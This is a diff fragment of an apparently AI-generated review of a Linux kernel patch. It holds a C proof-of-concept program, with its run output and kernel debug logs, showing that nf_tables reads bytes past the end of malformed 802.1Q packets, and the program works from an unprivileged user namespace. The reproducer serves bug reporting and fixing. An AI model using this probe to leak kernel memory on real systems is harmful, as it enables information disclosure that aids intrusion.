-        nest_end(d, p);
-        nest_end(e, p);
-
-        e =3D nest(&p, NFTA_LIST_ELEM);                   /* cmp reg1 =3D=
-=3D 1 */
-        p =3D put_str(p, NFTA_EXPR_NAME, "cmp");
-        d =3D nest(&p, NFTA_EXPR_DATA);
-        p =3D put_be32(p, NFTA_CMP_SREG, NFT_REG_1);
-        p =3D put_be32(p, NFTA_CMP_OP, 0 /* NFT_CMP_EQ */);
-        v =3D nest(&p, NFTA_CMP_DATA);
-        p =3D put(p, NFTA_DATA_VALUE, &one, 1);
-        nest_end(v, p);
-        nest_end(d, p);
-        nest_end(e, p);
-
-        e =3D nest(&p, NFTA_LIST_ELEM);                   /* counter */
-        p =3D put_str(p, NFTA_EXPR_NAME, "counter");
-        nest_end(e, p);
-
-        nest_end(ex, p);
-        return msg_end(cur, p);
-}
-
-static void nft_setup(void)
-{
-        static char buf[65536];
-        char *cur, *p, *hk;
-        int t =3D 0, i;
-
-        nl =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
-        if (nl < 0)
-                die("NETLINK_NETFILTER");
-
-        cur =3D batch(buf, NFNL_MSG_BATCH_BEGIN);
-        p =3D msg(cur, NFT_MSG_NEWTABLE, NLM_F_CREATE | NLM_F_ACK);
-        p =3D put_str(p, NFTA_TABLE_NAME, "t");
-        cur =3D msg_end(cur, p);
-        p =3D msg(cur, NFT_MSG_NEWCHAIN, NLM_F_CREATE | NLM_F_ACK);
-        p =3D put_str(p, NFTA_CHAIN_TABLE, "t");
-        p =3D put_str(p, NFTA_CHAIN_NAME, "c");
-        p =3D put_str(p, NFTA_CHAIN_TYPE, "filter");
-        hk =3D nest(&p, NFTA_CHAIN_HOOK);
-        p =3D put_be32(p, NFTA_HOOK_HOOKNUM, 0 /* NF_NETDEV_INGRESS */);
-        p =3D put_be32(p, NFTA_HOOK_PRIORITY, 0);
-        p =3D put_str(p, NFTA_HOOK_DEV, "vp1");
-        nest_end(hk, p);
-        cur =3D msg_end(cur, p);
-        cur =3D batch(cur, NFNL_MSG_BATCH_END);
-        nft_commit(buf, cur);
-
-        while (t < 256) {
-                cur =3D batch(buf, NFNL_MSG_BATCH_BEGIN);
-                for (i =3D 0; i < 32 && t < 256; i++)
-                        cur =3D rule(cur, t++);
-                cur =3D batch(cur, NFNL_MSG_BATCH_END);
-                nft_commit(buf, cur);
-        }
-}
-
-/* nf_tables dumps nests without NLA_F_NESTED, so walk the levels by hand *=
-/
-#define for_each_nla(x, a, len, rem)
-         \
-        for (x =3D (struct nlattr *)(a), rem =3D (len);
-         \
-            rem >=3D NLA_HDRLEN && x->nla_len >=3D NLA_HDRLEN &&
-x->nla_len <=3D rem; \
-            rem -=3D NLA_ALIGN(x->nla_len),
-         \
-            x =3D (struct nlattr *)((char *)x + NLA_ALIGN(x->nla_len)))
-#define NLA_DATA(x)     ((char *)(x) + NLA_HDRLEN)
-#define NLA_LEN(x)      ((x)->nla_len - NLA_HDRLEN)
-
-/* rule -> userdata (T) and expressions/elem/data/COUNTER_PACKETS */
-static void parse_rule(char *a, int len)
-{
-        struct nlattr *r, *el, *ex, *c;
-        int r1, r2, r3, r4, t =3D -1;
-        uint64_t pk =3D 0;
-
-        for_each_nla(r, a, len, r1) {
-                if (r->nla_type =3D=3D NFTA_RULE_USERDATA)
-                        t =3D (uint8_t)NLA_DATA(r)[0];
-                if (r->nla_type !=3D NFTA_RULE_EXPRESSIONS)
-                        continue;
-                for_each_nla(el, NLA_DATA(r), NLA_LEN(r), r2) {
-                        bool counter =3D false;
-
-                        for_each_nla(ex, NLA_DATA(el), NLA_LEN(el), r3) {
-                                if (ex->nla_type =3D=3D NFTA_EXPR_NAME)
-                                        counter =3D
-!strcmp(NLA_DATA(ex), "counter");
-                                else if (ex->nla_type =3D=3D
-NFTA_EXPR_DATA && counter)
-                                        for_each_nla(c, NLA_DATA(ex),
-NLA_LEN(ex), r4)
-                                                if (c->nla_type =3D=3D
-NFTA_COUNTER_PACKETS)
-                                                        pk =3D
-be64toh(*(uint64_t *)NLA_DATA(c));
-                        }
-                }
-        }
-        if (t >=3D 0)
-                cnt[t] =3D pk;
-}
-
-static void read_counters(void)
-{
-        static char rb[1 << 18];
-        char buf[256], *p =3D msg(buf, NFT_MSG_GETRULE, NLM_F_DUMP);
-        int n;
-
-        p =3D put_str(p, NFTA_RULE_TABLE, "t");
-        msg_end(buf, p);
-        if (send(nl, buf, ((struct nlmsghdr *)buf)->nlmsg_len, 0) < 0)
-                die("GETRULE");
-        while ((n =3D recv(nl, rb, sizeof(rb), 0)) > 0) {
-                struct nlmsghdr *r =3D (struct nlmsghdr *)rb;
-
-                for (; NLMSG_OK(r, n); r =3D NLMSG_NEXT(r, n)) {
-                        char *a =3D (char *)NLMSG_DATA(r) + sizeof(struct n=
-fgen);
-
-                        if (r->nlmsg_type =3D=3D NLMSG_DONE ||
-r->nlmsg_type =3D=3D NLMSG_ERROR)
-                                return;
-                        parse_rule(a, (char *)r + r->nlmsg_len - a);
-                }
-        }
-}
-
-/* --------------------------------------------------------------- probes *=
-/
-
-static void tx(const unsigned char *f, int len, uint16_t proto)
-{
-        struct sockaddr_ll sll =3D {};
-
-        sll.sll_family =3D AF_PACKET;
-        sll.sll_ifindex =3D ifi;
-        sll.sll_protocol =3D htons(proto);
-        sll.sll_halen =3D ETH_ALEN;
-        if (sendto(pfd, f, len, 0, (struct sockaddr *)&sll, sizeof(sll)) < =
-0)
-                die("sendto");
-}
-
-int main(void)
-{
-        unsigned char probe[18] =3D {
-                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x02, 0x02, 0x02,
-0x02, 0x02, 0x02,
-                0x81, 0x00,             /* ETH_P_8021Q */
-                0x00, 0x64,             /* vid 100 */
-                0x86, 0xdd,             /* inner: ETH_P_IPV6, then nothing =
-*/
-        };
-        uint64_t before[256];
-        cpu_set_t cs;
-        int r, t, hit =3D 0;
-
-        setvbuf(stdout, NULL, _IONBF, 0);
-        CPU_ZERO(&cs);
-        CPU_SET(0, &cs);
-        sched_setaffinity(0, sizeof(cs), &cs);
-
-        if (getuid() =3D=3D 0) {                    /* drop to an
-unprivileged user */
-                setgroups(0, NULL);
-                if (setresgid(1000, 1000, 1000) || setresuid(1000, 1000, 10=
-00))
-                        die("drop privileges");
-                prctl(PR_SET_DUMPABLE, 1);      /* lets us write our
-own uid_map */
-        }
-        printf("[*] uid=3D%d\n", getuid());
-        enter_ns();
-        /* keep IPv6 autoconf traffic off the veths */
-        write_file("/proc/sys/net/ipv6/conf/all/disable_ipv6", "1");
-        write_file("/proc/sys/net/ipv6/conf/default/disable_ipv6", "1");
-        rtnl_veth();
-        link_up("vp0");
-        link_up("vp1");
-        nft_setup();
-
-        pfd =3D socket(AF_PACKET, SOCK_RAW, 0);
-        ifi =3D if_nametoindex("vp0");
-        if (pfd < 0 || !ifi)
-                die("AF_PACKET");
-
-
-        printf("[*] sending %d 18-byte 802.1Q probes with no IPv6
-header\n", ROUNDS);
-        read_counters();
-        memcpy(before, cnt, sizeof(before));
-        for (r =3D 0; r < ROUNDS; r++) {
-                tx(probe, sizeof(probe), ETH_P_8021Q);
-                usleep(20000);
-        }
-        read_counters();
-        for (t =3D 0; t < 256; t++) {
-                if (cnt[t] =3D=3D before[t])
-                        continue;
-                printf("    rule 0x%02x fired %llu/%d: kernel read
-byte 0x%02x past skb tail\n",
-                      t, (unsigned long long)(cnt[t] - before[t]), ROUNDS, =
-t);
-                hit +=3D cnt[t] - before[t];
-        }
-        printf("[%c] %d/%d probes leaked a byte from past the end of
-the packet\n",
-              hit ? '+' : '-', hit, ROUNDS);
-        return !hit;
-}
-```
-
-My run output of your attached patch:
-```log
-[*] sending 64 18-byte 802.1Q probes with no IPv6 header
-    rule 0x01 fired 25/64: kernel read byte 0x01 past skb tail
-    rule 0x02 fired 2/64: kernel read byte 0x02 past skb tail
-    rule 0x03 fired 1/64: kernel read byte 0x03 past skb tail
-    rule 0x74 fired 1/64: kernel read byte 0x74 past skb tail
-...
-```
-
-I also confirmed the same result after inserting some debug to the kernel.
-
-```log
-[    4.041624] DBG_OOB head=3Dffff888021df96c0 nh=3D20 tail=3D20 end=3D384
-byte=3D0x00 ptr16_23(head+544)=3D0xdf
-[    4.061809] DBG_OOB head=3Dffff888021df9a00 nh=3D20 tail=3D20 end=3D384
-byte=3D0x00 ptr16_23(head+544)=3D0xdf
-[    4.081970] DBG_OOB head=3Dffff888021df63c0 nh=3D20 tail=3D20 end=3D384
-byte=3D0x00 ptr16_23(head+544)=3D0xdf
-[    4.102192] DBG_OOB head=3Dffff888021df6080 nh=3D20 tail=3D20 end=3D384
-byte=3D0x00 ptr16_23(head+544)=3D0xdf
-[    4.122357] DBG_OOB head=3Dffff888021de5a00 nh=3D20 tail=3D20 end=3D384
-byte=3D0x01 ptr16_23(head+544)=3D0xde
-...
-```
+--=20
+Sashiko AI review =C2=B7 https://sashiko.dev/#/patchset/cover.1795646914.gi=
+t.mathieu.desnoyers@efficios.com?part=3D26
